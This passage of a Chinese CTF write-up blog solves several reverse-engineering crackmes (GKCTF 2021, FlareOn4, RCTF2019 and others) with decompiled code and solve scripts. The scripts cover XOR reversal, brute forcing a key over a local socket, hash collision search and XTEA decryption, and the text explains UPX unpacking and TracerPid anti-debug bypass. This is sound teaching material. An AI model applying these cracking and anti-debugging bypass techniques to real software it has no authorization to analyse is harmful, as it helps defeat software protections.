array_0[local7[value_0]] = array_0[local7[1]] * array_0[local7[2]] elif local6 == '\\xeb\\xa2\\xaf': array_0[local7[value_0]] = array_0[local7[1]] / array_0[local7[2]] elif local6 == '\\xeb\\xa5\\x87': array_0[local7[value_0]] = array_0[local7[1]] &amp; array_0[local7[2]] elif local6 == '\\xeb\\xa7\\xb3': array_0[local7[value_0]] = array_0[local7[1]] | array_0[local7[2]] elif local6 == 'nop': array_0[local7[value_0]] = array_0[local7[value_0]] elif local6 == '\\xeb\\xab\\x87': array_0[local7[value_0]] = array_0[local7[1]] elif local6 == 'LoadParToArray_0': array_0[local7[value_0]] = local7[1] #加载参数到array[0]，参数1为位置，参数2为被加载的参数 elif local6 == '\\xeb\\xab\\xbb': array2[local7[value_0]] = array_0[local7[1]] elif local6 == '\\xeb\\x94\\x93': array_0[local7[value_0]] = array2[local7[1]] elif local6 == '\\xeb\\x8c\\x92': array_0[local7[value_0]] = value_0 elif local6 == '\\xeb\\xac\\x87': array2[local7[value_0]] = value_0 elif local6 == '\\xeb\\xac\\x9f': array_0[local7[value_0]] = input(array_0[local7[1]]) elif local6 == 'getInput': array2[local7[value_0]] = input(array_0[local7[1]]) #input elif local6 == 'printArray_0': print(array_0[local7[value_0]]) elif local6 == '\\xeb\\xad\\x97': print(array2[local7[value_0]]) elif local6 == '\\xeb\\xad\\xbf': local1 = array_0[local7[value_0]] elif local6 == '\\xeb\\xae\\x93': local1 = array2[local7[value_0]] elif local6 == '\\xeb\\xae\\xb3': local1 = local5.pop() elif local6 == '\\xeb\\xaf\\x83' :#or array_0[local7[1]] &gt; array_0[local7[2]]: local1 = local7[value_0] local5.append(local1) continue elif local6 == '\\xea\\xbd\\xb2': array_0[7] = value_0 for i in range(len(array_0[local7[value_0]])): if array_0[local7[value_0]] != array_0[local7[1]]: array_0[7] = 1 local1 = array_0[local7[2]] local5.append(local1) elif local6 == 'stringXOR': local8 = '' for i in range(len(array_0[local7[value_0]])): local8 += chr(ord(array_0[local7[value_0]][i]) ^ array_0[local7[1]]) array_0[local7[value_0]] = local8 elif local6 == 'StringSubtraction': local8 = '' for i in range(len(array_0[local7[value_0]])): local8 += chr(ord(array_0[local7[value_0]][i]) - array_0[local7[1]]) array_0[local7[value_0]] = local8 elif local6 == '\\xeb\\x96\\x87' or array_0[local7[1]] &gt; array_0[local7[2]]: local1 = array_0[local7[value_0]] local5.append(local1) continue elif local6 == '\\xeb\\x97\\x8b' or array_0[local7[1]] &gt; array_0[local7[2]]: local1 = array2[local7[value_0]] local5.append(local1) continue elif local6 == '\\xeb\\x98\\xb7' or array_0[local7[1]] == array_0[local7[2]]: local1 = local7[value_0] local5.append(local1) continue elif local6 == '\\xeb\\x9a\\xab' or array_0[local7[1]] == array_0[local7[2]]: local1 = array_0[local7[value_0]] local5.append(local1) continue elif local6 == '\\xeb\\x9d\\x87' and array_0[local7[1]] == array_0[local7[2]]: local1 = array2[local7[value_0]] local5.append(local1) continue local1 += 1func1([ [ 'LoadParToArray_0', value_0, 'Authentication token: '], #装载该字符串,array[0]='Authentication token: ' [ 'getInput', #获取输入，装载到array2[0] value_0, value_0], [ 'LoadParToArray_0', '\\xc3\\xa1\\xc3\\x97\\xc3\\xa4\\xc3\\x93\\xc3\\xa2\\xc3\\xa6\\xc3\\xad\\xc3\\xa4\\xc3\\xa0\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\x9b\\xc3\\xa3\\xc3\\xa5\\xc3\\xa4\\xc3\\x89\\xc3\\x96\\xc3\\x93\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x93\\xc3\\x89\\xc3\\x96\\xc3\\x93\\xc3\\xa5\\xc3\\xa4\\xc3\\x89\\xc3\\x93\\xc3\\x9a\\xc3\\x95\\xc3\\xa6\\xc3\\xaf\\xc3\\xa8\\xc3\\xa4\\xc3\\x9f\\xc3\\x99\\xc3\\x9a\\xc3\\x89\\xc3\\x9b\\xc3\\x93\\xc3\\xa4\\xc3\\xa0\\xc3\\x99\\xc3\\x94\\xc3\\x89\\xc3\\x93\\xc3\\xa2\\xc3\\xa6\\xc3\\x89\\xc3\\xa0\\xc3\\x93\\xc3\\x9a\\xc3\\x95\\xc3\\x93\\xc3\\x92\\xc3\\x99\\xc3\\xa6\\xc3\\xa4\\xc3\\xa0\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x93\\xc3\\x89\\xc3\\x9a\\xc3\\x93\\xc3\\xa1\\xc3\\x89\\xc2\\xb7\\xc3\\x94\\xc3\\xa2\\xc3\\x97\\xc3\\x9a\\xc3\\x95\\xc3\\x93\\xc3\\x94\\xc3\\x89\\xc2\\xb3\\xc3\\x9a\\xc3\\x95\\xc3\\xa6\\xc3\\xaf\\xc3\\xa8\\xc3\\xa4\\xc3\\x9f\\xc3\\x99\\xc3\\x9a\\xc3\\x89\\xc3\\x85\\xc3\\xa4\\xc3\\x97\\xc3\\x9a\\xc3\\x94\\xc3\\x97\\xc3\\xa6\\xc3\\x94\\xc3\\x89\\xc3\\x97\\xc3\\x9a\\xc3\\xaf\\xc3\\xa1\\xc3\\x97\\xc3\\xaf\\xc3\\xa5\\xc3\\x89\\xc3\\x9f\\xc3\\x89\\xc3\\x94\\xc3\\x99\\xc3\\x9a\\xc3\\xa4\\xc3\\x89\\xc3\\xa6\\xc3\\x93\\xc3\\x97\\xc3\\x9c\\xc3\\x9c\\xc3\\xaf\\xc3\\x89\\xc3\\xa0\\xc3\\x97\\xc3\\xa2\\xc3\\x93\\xc3\\x89\\xc3\\x97\\xc3\\x89\\xc3\\x91\\xc3\\x99\\xc3\\x99\\xc3\\x94\\xc3\\x89\\xc3\\xa2\\xc3\\x9f\\xc3\\x94\\xc3\\x89\\xc3\\x96\\xc3\\xa3\\xc3\\xa4\\xc3\\x89\\xc3\\x9f\\xc3\\x89\\xc3\\xa6\\xc3\\x93\\xc3\\x97\\xc3\\x9c\\xc3\\x9c\\xc3\\xaf\\xc3\\x89\\xc3\\x93\\xc3\\x9a\\xc3\\x9e\\xc3\\x99\\xc3\\xaf\\xc3\\x89\\xc3\\xa4\\xc3\\xa0\\xc3\\x9f\\xc3\\xa5\\xc3\\x89\\xc3\\xa5\\xc3\\x99\\xc3\\x9a\\xc3\\x91\\xc3\\x89\\xc3\\x9f\\xc3\\x89\\xc3\\xa0\\xc3\\x99\\xc3\\xa8\\xc3\\x93\\xc3\\x89\\xc3\\xaf\\xc3\\x99\\xc3\\xa3\\xc3\\x89\\xc3\\xa1\\xc3\\x9f\\xc3\\x9c\\xc3\\x9c\\xc3\\x89\\xc3\\x93\\xc3\\x9a\\xc3\\x9e\\xc3\\x99\\xc3\\xaf\\xc3\\x89\\xc3\\x9f\\xc3\\xa4\\xc3\\x89\\xc3\\x97\\xc3\\xa5\\xc3\\xa1\\xc3\\x93\\xc3\\x9c\\xc3\\x9c\\xc2\\x97\\xc3\\x89\\xc3\\xaf\\xc3\\x99\\xc3\\xa3\\xc3\\xa4\\xc3\\xa3\\xc3\\x96\\xc3\\x93\\xc2\\x9a\\xc3\\x95\\xc3\\x99\\xc3\\x9b\\xc2\\x99\\xc3\\xa1\\xc3\\x97\\xc3\\xa4\\xc3\\x95\\xc3\\xa0\\xc2\\xa9\\xc3\\xa2\\xc2\\xab\\xc2\\xb3\\xc2\\xa3\\xc3\\xaf\\xc2\\xb2\\xc3\\x95\\xc3\\x94\\xc3\\x88\\xc2\\xb7\\xc2\\xb1\\xc3\\xa2\\xc2\\xa8\\xc3\\xab'], [ 'LoadParToArray_0', #array0[2]=120 2, 120], [ 'LoadParToArray_0', # array0[4]=15 4, 15], [ 'LoadParToArray_0', #array0[3]=1 3, 1], [ 'multiple', #array0[2]=2*3=6 2, 2, 3], [ 'addition', #array0[2]=135 2, 2, 4], [ 'nop', value_0, 2], [ '\\xeb\\x8c\\x92', #array0[3]=0 3], [ 'stringXOR', #array0[6]=字符串^0 6, 3], [ 'LoadParToArray_0',#array0[0]='Thanks.' value_0, 'Thanks.'], [ 'LoadParToArray_0',#array0[1]='Authorizing access...' 1, 'Authorizing access...'], [ 'printArray_0', value_0], [ '\\xeb\\x94\\x93',# 将输入字符串装载到array_0[0]中 value_0, value_0], [ 'stringXOR',# ^135 value_0, 2], [ 'StringSubtraction',# 输入字符串-15 value_0, 4], [ 'LoadParToArray_0',# array0[5]=19 5, 19], [ '\\xea\\xbd\\xb2', value_0, 6, 5], [ 'printArray_0', #success 1], [ 'finish'], [ 'LoadParToArray_0', #fail 1, 'Access denied!'], [ 'printArray_0', 1], [ 'finish']]) 通过一步步分析可以发现，程序流程是对输入字符串和135异或，然后减15，与目标密文对比判断是否正确 逆一下得到flag:flag{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0} [ctfshow]逆向4一道链表题 拖进IDA，一开始有点懵，找到输入输出的字符串 注意由于不是utf-8编码，需要alt+a改变编码方式（注意关掉微信，不然会调出微信的截图功能） 继续看，点进sub_7FF7211C10E0中查看，一开始是一段类似辗转相除的算法，只是将结果替换为数组中的值 123456789101112131415v2 = 0; input2 = input; if ( input ) { v4 = &amp;v9; do { ++v4; ++v2; v5 = StrangeArray1[input2 + -26 * (input2 / 26)];// 类似辗转相除 input2 /= 26i64; *(v4 - 1) = v5; } while ( input2 ); } 然后是sub_7FF7211C11E0，这段是将上一段的结果异或7后通过链表串联起来，注意联系开始时初始化的那几个dword 12345678910111213_QWORD *__fastcall sub_7FF7211C11E0(char a1){ _QWORD *result; // rax __int64 v3; // rdx result = malloc(0x10ui64); v3 = globalItem1; // 最开始时给global1赋了一块内存，此时v3指向那块内存 globalItem1 = result; // 类似链表的结构 *(v3 + 8) = result; *v3 = a1; result[1] = 0i64; return result;} 最后进到sub_7FF7211C1220()，其实这个函数的功能就是和函数中的数组作比较，然后判断是否成功 123456789101112131415161718192021222324252627282930313233343536373839404142434445void __noreturn sub_7FF7211C1220(){ __int64 v0; // r9 int v1; // ecx __int64 v2; // rdx char v3; // al int v4; // er8 __int64 v5; // r9 char v6; // cl int v7; // eax v0 = globalItem2; // 链表头 v1 = 0; v2 = 0i64; while ( 1 ) { v3 = *v0; v4 = v1 + 1; v5 = *(v0 + 8); if ( v3 != StrangeArray2[v2 - 1] ) v4 = v1; globalItem2 = v5; if ( !v5 ) break; v6 = *v5; v7 = v4 + 1; v0 = *(v5 + 8); if ( v6 != StrangeArray2[v2] ) v7 = v4; globalItem2 = v0; if ( v0 ) { v2 += 2i64; v1 = v7; if ( v2 &lt; 14 ) continue; } goto LABEL_11; } v7 = v4;LABEL_11: if ( v7 == 14 ) success(); fail();} 最终脚本： 12345678910111213a=[0x2f,0x2e,0x2e,0x76,0x34,0x70,0x24,0x24,0x21,0x3e,0x59,0x35,0x39,0x2d]b=[0x29,0x28,0x2a,0x26,0x5e,0x25,0x34,0x38,0x39,0x24,0x21,0x30,0x35,0x37,0x40,0x23,0x3e,0x3c,0x3a,0x32,0x31,0x36,0x33,0x71,0x77,0x65]c=[]d=0print(len(b))for i in range(len(a)): a[i]=a[i]^7 c.append(b.index(a[i]))print(c)for i in range(len(c)): d*=26 d+=c[i]print(d) powerPackedpowerPC架构的，里面的指令根本读不懂，解题倒是很简单 加了个upx的壳，脱掉后就是很简单的对比： 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [sp+8h] [-58h] _BYTE v5[32]; // [sp+10h] [-50h] BYREF char v6[24]; // [sp+30h] [-30h] BYREF int v7; // [sp+48h] [-18h] const char **v8; // [sp+4Ch] [-14h] v7 = argc; v8 = argv; strcpy(v6, &quot;EHK}kanqxgarqygtre&quot;); printf(&quot;Insert password : &quot;, argv, envp); _isoc99_scanf(&quot;%31s&quot;, v5); for ( i = 0; i &lt; 21; ++i ) v6[i] -= 2; if ( strcmp(v5, v6) ) puts(&quot;Wrong password.&quot;); else puts(&quot;Password is correct. Submit this as the flag.&quot;); return 0;} 逐位减2后就得到了flag:CFI{i_love_powerpc} [FlareOn4]greek_to_me使用c实现的网络通信 相关函数：1int socket(int domain, int type, int protocol); type：指定socket类型。常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等等（socket的类型有哪些？）。 domain：即协议域，又称为协议族（family）。常用的协议族有，AF_INET、AF_INET6、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。 protocol：故名思意，就是指定协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议 1int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); sockfd：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字 addr：一个const struct sockaddr *指针，指向要绑定给sockfd的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同，如ipv4对应的是： 12345678910struct sockaddr_in { sa_family_t sin_family; in_port_t sin_port; struct in_addr sin_addr; };struct in_addr { uint32_t s_addr; }; 开始解题拖进IDA，发现与是用C实现的一段网络通信 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int __usercall sub_401008@&lt;eax&gt;(int _EDI@&lt;edi&gt;, _DWORD *a2@&lt;esi&gt;){ _BYTE *v2; // eax char v3; // dl bool v5; // cf unsigned int v6; // ett int v7; // edx int v9; // [esp-4h] [ebp-1Ch] char buf[4]; // [esp+10h] [ebp-8h] BYREF SOCKET s; // [esp+14h] [ebp-4h] int savedregs; // [esp+18h] [ebp+0h] BYREF s = sub_401121(buf); // 创建进程，并接收4字节的消息，消息写入buf中 if ( !s ) return 0; v2 = &amp;loc_40107C; v3 = buf[0]; do { *v2 = (v3 ^ *v2) + 34; // SMC ++v2; } while ( (int)v2 &lt; (int)&amp;loc_40107C + 121 ); if ( (unsigned __int16)sub_4011E6(&amp;loc_40107C, 121) == 64350 )// SMC解密是否正确 { _EBX = *(_DWORD *)(v9 + 377554449); __asm { lock xor bl, [edi+61791C4h] } v5 = __CFADD__(*(_DWORD *)(8 * (_DWORD)a2 + 0xFB5E), -250248954); *(_DWORD *)(8 * (_DWORD)a2 + 0xFB5E) -= 250248954; if ( v9 == 1 ) { v6 = v5 + 427886322; v5 = MEMORY[0xFB5E] &lt; v6; MEMORY[0xFB5E] -= v6; } __asm { icebp } *a2 -= v5 + 530171120; v7 = *(_DWORD *)(v9 - 1 + 494994972); __outbyte(6u, 0x5Eu); *(_DWORD *)(v7 - 17) &amp;= 0xF2638106; MEMORY[0xFB41] &amp;= 0x66199C4u; *(a2 - 17) &amp;= 0xE6678106; *(_DWORD *)(8 * (_DWORD)&amp;savedregs + 64350 + 6) &amp;= 0x69D6581u; *(_DWORD *)(v7 - 14) -= 107715012; MEMORY[0xFB07] += 278298362; *(_DWORD *)((char *)a2 - 18) += 1368424186; *(_DWORD *)(_EBX + 6) -= 116354433; *(_DWORD *)(v7 - 23) ^= 0x7C738106u; send(s, &quot;Congratulations! But wait, where's my flag?&quot;, 43, 0); } else { send(s, &quot;Nope, that's not it.&quot;, 20, 0); } closesocket(s); return WSACleanup();} 中间有一段验证函数，但是这段函数不好逆，而总情况也只有256种，不如进行一个暴力破解 12345678910111213141516171819import sysimport osimport socketfrom pwn import *ip = '127.0.0.1'port = 2222for i in range(256): os.startfile(&quot;greek_to_me.exe&quot;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, port)) s.send(p32(i)) #注意大小端，否则跑不出来 data = s.recv(1024) s.close() print(data) if b'Congratulations' in data: print(&quot;that's it!&quot;) break print(i)print('end') 跑出来i=162，进行动调 12345678910import sysimport osimport socketfrom pwn import *ip = '127.0.0.1'port = 2222i=162s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))s.send(p32(i)) 按c转为代码，flag就出来了 [GKCTF 2021]Crashgo逆向，换了IDA7.7来做，感觉真不错 主要的判断函数为main_check 第一段是一段3DES+base64，key和iv在off_61e540中，解出来为87f645e9-b628-412f-9d7a- 第二段是Sha256碰撞 到第三段的时候就会发现问题：这段函数返回值为0，而事实上返回值必然不能为0；并且第三段哈希值并未给出，说明这段函数的反编译出了问题 进到汇编函数中，把对应的retn相关代码nop掉，这时候可以看到剩余的碰撞部分 整个脚本来跑碰撞： 1234567891011121314151617181920212223import hashlibimport stringh1='6e2b55c78937d63490b4b26ab3ac3cb54df4c5ca7d60012c13d2d1234a732b74' #sha256h2='6500fe72abcab63d87f213d2218b0ee086a1828188439ca485a1a40968fd272865d5ca4d5ef5a651270a52ff952d955c9b757caae1ecce804582ae78f87fa3c9' #sha512h3='ff6e2fd78aca4736037258f0ede4ecf0' #md5s=''ans1=''ans2=''ans3=''table='0123456789abcdef-'# print(table)for i1 in table: for i2 in table: for i3 in table: for i4 in table: s=i1+i2+i3+i4 if hashlib.sha256(s.encode()).hexdigest()==h1: ans1=s if hashlib.sha512(s.encode()).hexdigest()==h2: ans2=s if hashlib.md5(s.encode()).hexdigest()==h3: ans3=sprint(ans1+ans2+ans3) 拼起来即可得到flag [GKCTF 2021]SoMuchCode动调是个好东西 动调定位到输入和输出函数，然后在1209行找到关键的encrypt函数 点进行，按x查看引用，能大概看出是个XTEA算法 循环12轮 12345678*input += ((key[(v75 &gt;&gt; 2) &amp; 3] ^ input[7]) + (input[1] ^ v75)) ^ (((16 * input[7]) ^ (input[1] &gt;&gt; 3)) + ((input[7] &gt;&gt; 5) ^ (4 * input[1])));input[1] += (((key[v120] ^ input[0]) + (input[2] ^ v75)) ^ (((16 * input[0]) ^ (input[2] &gt;&gt; 3))+ ((input[0] &gt;&gt; 5) ^ (4 * input[2]))));input[2] += + ((((16 * input[1]) ^ (input[3] &gt;&gt; 3)) + ((input[1] &gt;&gt; 5) ^ (4 * input[3]))) ^ ((input[3] ^ v75) + (key[v123] ^ input[1])));input[3] += + ((((16 * input[2]) ^ (input[4] &gt;&gt; 3)) + ((input[2] &gt;&gt; 5) ^ (4 * input[4]))) ^ ((input[4] ^ v75) + (key[v115 ^ 3] ^ input[2])));input[4]=input[4] + ((((16 * input[3]) ^ (input[5] &gt;&gt; 3)) + ((input[3] &gt;&gt; 5) ^ (4 * input[5]))) ^ ((input[5] ^ v75) + (key[v99] ^ input[3])));input[5]=(((key[v120] ^ input[4]) + (input[6] ^ v75)) ^ (((16 * input[4]) ^ (input[6] &gt;&gt; 3))+ ((input[4] &gt;&gt; 5) ^ (4 * input[6]))))+ v127input[6]+= ((((16 * input[5]) ^ (input[7] &gt;&gt; 3)) + ((input[5] &gt;&gt; 5) ^ (4 * input[7]))) ^ ((key[v123] ^ input[5])+ (input[7] ^ v75)));input[7] += ((input[6]&gt;&gt;5)+(input[0]*4) + ((input[0] &gt;&gt; 3) ^ (16 * input[6]))) ^ ((input[0] ^ v75) + (key[v210] ^ input[6])); 每轮加密过程如以下形式，v75可以推测是sum值，动调出来发现每轮自增0x33445566 1input[x] += + ((((16 * input[x-1]) ^ (input[x+1] &gt;&gt; 3)) + ((input[x-1] &gt;&gt; 5) ^ (4 * input[x+1]))) ^ ((input[x+1] ^ v75) + (key[?] ^ input[1]))); 动调找到key 动调找到要对比的数据 123456789101112131415161718192021222324252627282930313233343536.data:00007FF6C82CA6D0 byte_7FF6C82CA6D0 db 5Ch ; DATA XREF: main+F69↑w.data:00007FF6C82CA6D0 ; main:loc_7FF6C82C3945↑w ....data:00007FF6C82CA6D1 byte_7FF6C82CA6D1 db 0ABh ; DATA XREF: main+1119↑w.data:00007FF6C82CA6D1 ; main:loc_7FF6C82C3AF5↑w.data:00007FF6C82CA6D2 byte_7FF6C82CA6D2 db 3Ch ; DATA XREF: main+12C9↑w.data:00007FF6C82CA6D2 ; main:loc_7FF6C82C3CA5↑w.data:00007FF6C82CA6D3 byte_7FF6C82CA6D3 db 99h ; DATA XREF: main+147A↑w.data:00007FF6C82CA6D3 ; main:loc_7FF6C82C3E56↑w.data:00007FF6C82CA6D4 byte_7FF6C82CA6D4 db 29h ; DATA XREF: main:loc_7FF6C82C3F1F↑w.data:00007FF6C82CA6D5 byte_7FF6C82CA6D5 db 0E1h ; DATA XREF: main:loc_7FF6C82C3FEF↑w.data:00007FF6C82CA6D6 byte_7FF6C82CA6D6 db 40h ; DATA XREF: main:loc_7FF6C82C40BF↑w.data:00007FF6C82CA6D7 byte_7FF6C82CA6D7 db 3Fh ; DATA XREF: main:loc_7FF6C82C418F↑w.data:00007FF6C82CA6D8 byte_7FF6C82CA6D8 db 0DEh ; DATA XREF: main:loc_7FF6C82C425F↑w.data:00007FF6C82CA6D9 byte_7FF6C82CA6D9 db 91h ; DATA XREF: main:loc_7FF6C82C432F↑w.data:00007FF6C82CA6DA byte_7FF6C82CA6DA db 77h ; DATA XREF: main:loc_7FF6C82C43FF↑w.data:00007FF6C82CA6DB byte_7FF6C82CA6DB db 77h ; DATA XREF: main:loc_7FF6C82C44CF↑w.data:00007FF6C82CA6DC byte_7FF6C82CA6DC db 0A6h ; DATA XREF: main:loc_7FF6C82C459F↑w.data:00007FF6C82CA6DD byte_7FF6C82CA6DD db 0FEh ; DATA XREF: main:loc_7FF6C82C466F↑w.data:00007FF6C82CA6DE byte_7FF6C82CA6DE db 7Dh ; DATA XREF: main:loc_7FF6C82C473F↑w.data:00007FF6C82CA6DF byte_7FF6C82CA6DF db 73h ; DATA XREF: main:loc_7FF6C82C480F↑w.data:00007FF6C82CA6E0 byte_7FF6C82CA6E0 db 0E6h ; DATA XREF: main:loc_7FF6C82C48DF↑w.data:00007FF6C82CA6E1 byte_7FF6C82CA6E1 db 59h ; DATA XREF: main:loc_7FF6C82C49AF↑w.data:00007FF6C82CA6E2 byte_7FF6C82CA6E2 db 0CFh ; DATA XREF: main:loc_7FF6C82C4A7F↑w.data:00007FF6C82CA6E3 byte_7FF6C82CA6E3 db 0ECh ; DATA XREF: main:loc_7FF6C82C4B4F↑w.data:00007FF6C82CA6E4 byte_7FF6C82CA6E4 db 0E3h ; DATA XREF: main:loc_7FF6C82C4C1F↑w.data:00007FF6C82CA6E5 byte_7FF6C82CA6E5 db 4Ch ; DATA XREF: main:loc_7FF6C82C4CEF↑w.data:00007FF6C82CA6E6 byte_7FF6C82CA6E6 db 60h ; DATA XREF: main:loc_7FF6C82C4DBF↑w.data:00007FF6C82CA6E7 byte_7FF6C82CA6E7 db 0C9h ; DATA XREF: main:loc_7FF6C82C4E8F↑w.data:00007FF6C82CA6E8 byte_7FF6C82CA6E8 db 0A5h ; DATA XREF: main:loc_7FF6C82C4F5F↑w.data:00007FF6C82CA6E9 byte_7FF6C82CA6E9 db 0C0h ; DATA XREF: main:loc_7FF6C82C502F↑w.data:00007FF6C82CA6EA byte_7FF6C82CA6EA db 82h ; DATA XREF: main:loc_7FF6C82C50FF↑w.data:00007FF6C82CA6EB byte_7FF6C82CA6EB db 96h ; DATA XREF: main:loc_7FF6C82C526C↑w.data:00007FF6C82CA6EC byte_7FF6C82CA6EC db 1Eh ; DATA XREF: main:loc_7FF6C82C53D9↑w.data:00007FF6C82CA6ED byte_7FF6C82CA6ED db 2Ah ; DATA XREF: main:loc_7FF6C82C5546↑w.data:00007FF6C82CA6EE byte_7FF6C82CA6EE db 6Fh ; DATA XREF: main:loc_7FF6C82C56B3↑w.data:00007FF6C82CA6EF byte_7FF6C82CA6EF db 55h ; DATA XREF: main:loc_7FF6C82C5820↑w 写出解题脚本： 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;void decipher(unsigned int num_rounds, unsigned int input[8], unsigned int key[4]) { unsigned int i; unsigned int delta=0x33445566, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) { input[7]-= ((((16 * input[6]) ^ (input[0] &gt;&gt; 3)) + ((input[6] &gt;&gt; 5) ^ (4 * input[0]))) ^ ((input[0] ^ sum) + (key[((sum &gt;&gt; 2) &amp; 3)^3] ^ input[6]))); input[6]-= ((((16 * input[5]) ^ (input[7] &gt;&gt; 3)) + ((input[5] &gt;&gt; 5) ^ (4 * input[7]))) ^ ((key[((sum &gt;&gt; 2) &amp; 3)^2] ^ input[5])+ (input[7] ^ sum))); input[5]-= ((((16 * input[4]) ^ (input[6] &gt;&gt; 3)) + ((input[4] &gt;&gt; 5) ^ (4 * input[6]))) ^ ((key[((sum &gt;&gt; 2) &amp; 3)^1] ^ input[4]) + (input[6] ^ sum)) ); input[4]-= ((((16 * input[3]) ^ (input[5] &gt;&gt; 3)) + ((input[3] &gt;&gt; 5) ^ (4 * input[5]))) ^ ((input[5] ^ sum) + (key[(sum &gt;&gt; 2) &amp; 3] ^ input[3]))); input[3]-= ((((16 * input[2]) ^ (input[4] &gt;&gt; 3)) + ((input[2] &gt;&gt; 5) ^ (4 * input[4]))) ^ ((input[4] ^ sum) + (key[((sum &gt;&gt; 2) &amp; 3) ^ 3] ^ input[2]))); input[2]-= ((((16 * input[1]) ^ (input[3] &gt;&gt; 3)) + ((input[1] &gt;&gt; 5) ^ (4 * input[3]))) ^ ((input[3] ^ sum) + (key[((sum &gt;&gt; 2) &amp; 3)^2] ^ input[1]))); input[1]-= ((((16 * input[0]) ^ (input[2] &gt;&gt; 3)) + ((input[0] &gt;&gt; 5) ^ (4 * input[2]))) ^ ((key[((sum &gt;&gt; 2) &amp; 3)^1] ^ input[0]) + (input[2] ^ sum))); input[0]-= ((((16 * input[7]) ^ (input[1] &gt;&gt; 3)) + ((input[7] &gt;&gt; 5) ^ (4 * input[1]))) ^ ((key[(sum &gt;&gt; 2) &amp; 3] ^ input[7]) + (input[1] ^ sum))) ; sum -= delta; }}int main(){ unsigned int v[8]={0x993cab5c,0x3f40e129,0x777791de,0x737dfea6,0xeccf59e6,0xc9604ce3,0x9682c0a5,0x556f2a1e}; //unsigned int v[8]={0x5cab3c99,0x29e1403f,0xde917777,0xa6fe7d73,0xe659cfec,0xe34c60c9,0xa5c08296,0x1e2a6f55}; unsigned int k[4]={0x36b0,0x13816,0x10,0x1e0f3}; unsigned int r=12;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%x %x\\n&quot;,v[0],v[1]); decipher(r, v, k); printf(&quot;解密后的数据：%s\\n&quot;,v); return 0;} GKCTF{9b34a61df773acf0e4dec25ea5fb0e29} [GKCTF 2021]app-debug一开始用jadx打开，进到mainActivity，有个关键的check函数没有出来，看了网上的wp才知道引用了外部库 IDA打开，发现有.so文件 进去后搜索main，进到关键加密函数，是一个TEA加密的结构 但是其中key的值是假的，程序通过TracerPid进行反调试，通过寻找交叉引用可以找到真正的key 当我们使用IDA attach程序的时候，在/proc/{PID}/status文件的TracerPid字段会写入调试程序的PID 也就是说使用TracerPid反调试的原理就是检测这个字段是否为0，为0说明没有被调试，不为0说明正在被调试，检测调试器直接退出就可以达到反调试的效果 作者：Sharkchilli链接：https://www.jianshu.com/p/cae682a27f0c [RCTF2019]DontEatMe发现存在反调试，把17改为16绕过 测试输入：0123456798abcdef0123456798abcdef 分析一下程序的流程，大致是获取十六进制输入，对输入做加密，然后生成迷宫，走迷宫 从迷宫开始分析，大致就是先给某个数据段附了值，然后将该数据段与某一串数据进行异或，异或后的值转为二进制来生成迷宫 将生成后的迷宫放出来：(s为起点，e为终点) 123456789101112131415161 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 1 1 1 1 11 0 1 1 1 1 1 1 1 0 1 1 1 1 1 11 0 1 1 1 1 0 0 0 e 0 0 0 1 1 11 0 1 1 1 1 0 1 1 1 1 1 0 1 1 11 0 1 1 1 1 0 1 1 1 1 1 0 1 1 11 0 1 1 1 1 0 0 0 0 1 1 0 1 1 11 0 1 1 1 1 1 1 1 0 1 1 0 1 1 11 0 1 1 1 1 1 1 1 0 1 1 0 1 1 11 0 0 0 0 s 0 0 0 0 1 1 0 1 1 11 1 1 1 1 0 1 1 1 1 1 1 0 1 1 11 1 1 1 1 0 0 0 0 0 0 0 0 1 1 11 1 1 1 1 1 1 1 1 1 1 1 1 1 1 11 1 1 1 1 1 1 1 1 1 1 1 1 1 1 11 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 迷宫路径：ddddwwwaaawwwddd 然后要做的就是解密了 中间的解密算法了解了一下才知道是BLOWFISH加密算法 flag{db824ef8605c5235b4bbacfa2ff8e087} [SUSCTF 2022]hell_world参考【SUSCTF2022】DigitalCircuits &amp; hell_world &amp; tttree去花_哔哩哔哩_bilibili IDA64打开，可以发现有很多函数，其中有大量代码，难以入手 shift+f12搜索字符串，查找flag，交叉引用进到相关函数中，可以发现一个类似虚拟机的东西 动调，case0执行完并没有输出其中的字符串”Input Flag:”，猜测只是将字符串加载到缓冲区中 case1执行完后，”Input Flag”被输出，猜测该部分作用为输出缓冲区内容 在case2中单步调试时停止不动，开始输入，可知该部分作用为获得输入 而case2运行完后接着运行case3，其中v2=5时进入case 5，case 5中”Wrong”提示不能进入该部分，同时猜测该case3作用为判断输入长度 接下来的流程为case9 -&gt; case10 -&gt; case11-&gt;case10-&gt;case11-&gt;case10… 